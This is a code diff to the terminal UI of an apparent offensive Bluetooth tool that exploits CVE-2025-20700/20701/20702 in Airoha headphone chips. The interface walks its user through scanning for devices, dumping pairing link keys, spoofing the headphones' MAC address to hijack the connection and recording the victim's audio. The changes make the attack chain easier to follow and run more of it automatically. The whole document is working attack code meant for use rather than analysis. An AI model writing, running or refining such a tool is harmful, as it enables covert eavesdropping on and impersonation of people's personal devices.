@@ -430,6 +430,7 @@ class RACEAttackScreen(urwid.WidgetWrap):
         self._target_name = ""
         self._headphone_mac = ""    # Classic BT MAC of headphones
         self._link_keys: list[tuple[str, bytes]] = []
+        self._hijacked = False
         self._audio_proc: subprocess.Popen | None = None
         self._audio_file = ""
 
@@ -443,13 +444,14 @@ class RACEAttackScreen(urwid.WidgetWrap):
                         "  CVE-2025-20700/20701/20702\n\n"
                         "  Exploits unauthenticated RACE debug protocol\n"
                         "  in Airoha BT chips (Sony, JBL, Bose, Marshall...)\n\n"
-                        "  Attack chain:\n"
+                        "  Attack chain (follow in order):\n"
                         "  1. [s] Scan — find BLE devices\n"
-                        "  2. [c] Check — connect, verify RACE vuln\n"
-                        "  3. [e] Extract — dump link keys\n"
-                        "  4. [h] Hijack — impersonate headphones\n"
+                        "  2. [c] Pick — select device from list\n"
+                        "       (auto-checks RACE vuln + extracts keys)\n"
+                        "  3. [e] Extract — flash dump (if [c] got no keys)\n"
+                        "  4. [h] Hijack — spoof MAC, impersonate device\n"
                         "  5. [l] Listen — capture audio stream\n\n"
-                        "  No pairing needed. Zero user interaction.\n"
+                        "  Each step guides you if something is missing.\n"
                         "  [x] Stop / cleanup  [esc] Back\n")),
         ]))
         self._body = urwid.WidgetPlaceholder(self._idle_view)
@@ -493,15 +495,30 @@ class RACEAttackScreen(urwid.WidgetWrap):
     # ------------------------------------------------------------------
 
     def refresh(self) -> None:
-        if self._link_keys:
+        if self._audio_proc:
             self._info.set_text(
                 ("attack_active",
-                 f"  RACE — {self._target_name}  Keys:{len(self._link_keys)}  HP:{self._headphone_mac}")
+                 f"  RACE — RECORDING from {self._target_name}  [x] to stop")
+            )
+        elif self._hijacked:
+            self._info.set_text(
+                ("attack_active",
+                 f"  RACE — HIJACKED as {self._headphone_mac}  [l] to listen")
+            )
+        elif self._link_keys:
+            self._info.set_text(
+                ("success",
+                 f"  RACE — {self._target_name}  Keys:{len(self._link_keys)}  [h] to hijack")
+            )
+        elif self._target_addr and not self._running:
+            self._info.set_text(
+                ("warning",
+                 f"  RACE — {self._target_name}  [c] check / [e] extract")
             )
         elif self._running:
             self._info.set_text(("warning", "  RACE Attack — working..."))
         else:
-            self._info.set_text(("warning", "  RACE Attack — idle"))
+            self._info.set_text(("warning", "  RACE Attack — idle  [s] to scan"))
 
     # ------------------------------------------------------------------
     # Scan
@@ -686,14 +703,20 @@ class RACEAttackScreen(urwid.WidgetWrap):
     # ------------------------------------------------------------------
 
     def _do_hijack(self) -> None:
-        if not self._headphone_mac:
-            self._log.append("  No headphone MAC — run [c] check first", "warning")
+        self._body.original_widget = self._log
+
+        # Guide user through missing steps
+        if not self._target_addr:
+            if self._scanned:
+                self._log.append("  Select a device first: [c] to pick from list", "warning")
+            else:
+                self._log.append("  Step 1: [s] scan for devices first", "warning")
             return
         if not self._link_keys:
-            self._log.append("  No link keys — run [e] extract first", "warning")
+            self._log.append("  Step 2: need link keys — running check...", "warning")
+            self._do_check(self._target_addr, self._target_name)
+            self._log.append("  After check completes, try [h] again or [e] for flash dump", "dim")
             return
-
-        self._body.original_widget = self._log
 
         # Show picker if multiple keys
         if len(self._link_keys) > 1:
@@ -740,6 +763,7 @@ class RACEAttackScreen(urwid.WidgetWrap):
                 self._log.append("  A2DP sink configured", "success")
 
                 # Step 4: Wait for phone to connect
+                self._hijacked = True
                 self._log.append("  [4/4] Waiting for phone to auto-connect...", "attack_active")
                 self._log.append("  (Phone should reconnect within 30-60s)", "dim")
                 self._log.append("  Press [l] to start listening when connected", "dim")
@@ -763,6 +787,21 @@ class RACEAttackScreen(urwid.WidgetWrap):
 
     def _do_listen(self) -> None:
         self._body.original_widget = self._log
+
+        # Guide user through missing steps
+        if not self._target_addr:
+            if self._scanned:
+                self._log.append("  Select a device first: [c] to pick from list", "warning")
+            else:
+                self._log.append("  Step 1: [s] scan for devices first", "warning")
+            return
+        if not self._link_keys:
+            self._log.append("  Need link keys first — press [c] to check device", "warning")
+            return
+        if not self._hijacked:
+            self._log.append("  Need to hijack first — press [h] to impersonate", "warning")
+            return
+
         self._log.append(">>> Looking for BT audio source...", "attack_active")
 
         def _listen_thread():
@@ -836,6 +875,7 @@ class RACEAttackScreen(urwid.WidgetWrap):
         os.system("systemctl start bluetooth 2>/dev/null")
 
         self.state.race_running = False
+        self._hijacked = False
         self._link_keys.clear()
         self._headphone_mac = ""
         self._log.append(">>> RACE stopped", "warning")
